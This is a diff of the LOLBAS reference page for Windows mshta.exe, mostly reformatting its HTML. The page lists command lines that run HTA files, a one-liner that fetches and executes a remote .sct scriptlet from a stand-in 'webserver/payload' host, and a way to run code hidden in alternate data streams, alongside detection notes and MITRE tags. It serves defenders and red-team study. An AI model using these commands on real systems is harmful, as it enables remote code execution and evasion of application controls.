@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Mshta/#execute">Execute</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Mshta/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Mshta/#execute">Execute</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Mshta/#ads">Alternate data streams</a></li>
+	
 </ul>
 
+	
+
 <p>Used by Windows to execute html applications. (.hta)</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,128 +57,114 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a></li>
+	<a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a>
+	<br>
 	
-	<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct</a></li>
+	<a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct</a>
+	<br>
 	
-	<li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a></li>
+	<a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a>
+	<br>
 	
-	<li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></li>
+	<a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a </li>
+	Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a>
+	<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>mshta.exe executing raw or obfuscated script within the command-line</li>
+	mshta.exe executing raw or obfuscated script within the command-line
+	<br>
 	
-	<li>Usage of HTA file</li>
+	Usage of HTA file
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+		<br>
+		<pre><code>mshta.exe evilfile.hta</code></pre>
 		Usecase:Execute code
-        <pre><code>mshta.exe evilfile.hta</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Executes VBScript supplied as a command line argument.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Executes VBScript supplied as a command line argument.
+		<br>
+		<pre><code>mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code></pre>
 		Usecase:Execute code
-        <pre><code>mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Executes JavaScript supplied as a command line argument.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Executes JavaScript supplied as a command line argument.
+		<br>
+		<pre><code>mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();</code></pre>
 		Usecase:Execute code
-        <pre><code>mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.
+		<br>
+		<pre><code>mshta.exe "C:\ads\file.txt:file.hta"</code></pre>
 		Usecase:Execute code hidden in alternate data stream
-        <pre><code>mshta.exe "C:\ads\file.txt:file.hta"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1170">T1170</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
